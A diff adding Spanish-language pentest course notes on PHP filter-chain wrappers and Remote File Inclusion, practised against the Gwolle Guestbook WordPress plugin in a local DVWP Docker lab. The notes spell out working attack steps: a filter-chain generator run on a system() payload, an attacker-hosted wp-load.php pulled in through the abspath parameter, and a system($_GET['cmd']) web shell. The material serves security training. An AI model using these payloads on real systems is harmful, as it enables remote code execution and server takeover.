@@ -3403,4 +3403,156 @@ GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%
 
 
 
+
+# Otro wrapper FILTER CHAIN
+php -r "echo base64_encode("Hola");"; # Con php representamos la cadena hola en base64
+
+php -r "echo base64_decode("SG9sYQ==");"; # Con php decodeamos la cadena lo cual es igual a hola
+
+php -r "echo base64_decode("&_<SG9sYQ==");"; # Sigue marcando el hola
+
+cd /tmp/
+
+echo "&_<SG9sYQ==" > test
+
+php -r 'echo base64_decode(file_get_contents('/tmp/test'));'; echo
+
+
+# Hay muchos tipos de encoding
+# Herramienta de python que me ayudará a colarla
+python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>' 
+
+```
+
+### Remote File Inclusion (RFI)
+
+La vulnerabilidad **Remote File Inclusion** (**RFI**) es una vulnerabilidad de seguridad en la que un atacante puede **incluir archivos remotos** en una aplicación web vulnerable. Esto puede permitir al atacante ejecutar código malicioso en el servidor web y comprometer el sistema. En un ataque de RFI, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para incluir un archivo remoto en la solicitud. Si la aplicación web no valida adecuadamente estas entradas, procesará la solicitud y devolverá el contenido del archivo remoto al atacante. Un atacante puede utilizar esta vulnerabilidad para incluir archivos remotos maliciosos que contienen código malicioso, como virus o troyanos, o para ejecutar comandos en el servidor vulnerable. En algunos casos, el atacante puede dirigir la solicitud hacia un recurso PHP alojado en un servidor de su propiedad, lo que le brinda un mayor grado de control en el ataque. A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando para practicar esta vulnerabilidad.
+
+[DVWP](https://github.com/vavkamil/dvwp)
+
+Asimismo, se comparte el enlace directo para la descarga del plugin 'Gwolle Guestbook' de Wordpress:
+
+[Gwolle Guestbook](https://es.wordpress.org/plugins/gwolle-gb/)
+
+```bash
+searchsploit gwolle
+
+git clone https://github.com/vavkamil/dvwp
+
+cd directorio
+
+docker-compose up -d --build
+
+docker ps
+
+# Nos metemos al navegador
+
+localhost:31337
+
+# Hack4u Academy, S4vitar, s4vitar123, confirm pass, email
+
+docker-compose run --rm wp-cli install-wp
+
+searchsploit gwolle
+
+# https://downloads.wordpress.org/plugin/gwolle-gb.1.5.3.zip
+
+docker ps
+
+docker exec -it dvwp_wordpress_1 bash # subiremos el archivo que descargamos
+
+cd /var/www/html
+
+ls wp-content/
+
+chown www-data:www-data -R wp-content/
+
+# Vamos a la web, con la sesion iniciada, vamos a plugins/add new/upload plugin browse -> subimos el plugin y damos a install now -> activate plugin
+
+exit
+
+pushd /usr/share/seclist
+
+find \-name \*plugin\*
+
+dirname ./Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
+
+cd $(dirname ./Discovery/Web-Content/CMS/wp-plugins.fuzz.txt)
+
+cat wp-plugins.fuzz.txt
+
+wfuzz -c --hc=404 -t 200 -w wp-plugins.fuzz.txt http://localhost:31337/FUZZ
+
+# Nos debe descubrir el plugin gwolle
+# Lo buscamos en metasploit
+
+searchsploit gwolle
+
+# Vemos el remote file inclusion, nos copiamos el PATH que arrojó el serchsploit
+
+searchsploit -x php/webapps/38861.txt # Para examinar el codigo de esta vulnerabilidad
+
+python3 -m http.server 80
+
+http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://miIP/ 
+
+# Habilitaremos allow_url_include en php.ini del container
+
+cat php.ini; echo
+
+apt update && apt install nano
+
+nano php.ini # Agregamos la sentencia allow_url_include
+allow_url_include = "on"
+exit # Salimos del container
+
+docker restart dvwp_wordpress_1
+
+# Recargamos
+http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://miIP/
+
+# Deberiamos poder ver la peticion en el servidor python
+
+# Creamos el archivo que está solicitando
+nvim wp-load.php
+<?php
+    system("whoami");
+?>
+
+# Recargamos la pagina y debemos de ver el comando ejecutado
+
+nvim wp-load.php
+<?php
+    system("hostname -I");
+?>
+
+# Recargamos la página y debemos de ver el comando ejecutado
+
+
+
+
+
+nvim wp-load.php
+<?php
+    system($_GET['cmd']);
+?>
+
+# En el navegador
+http://localhost:31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://miIP/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ```
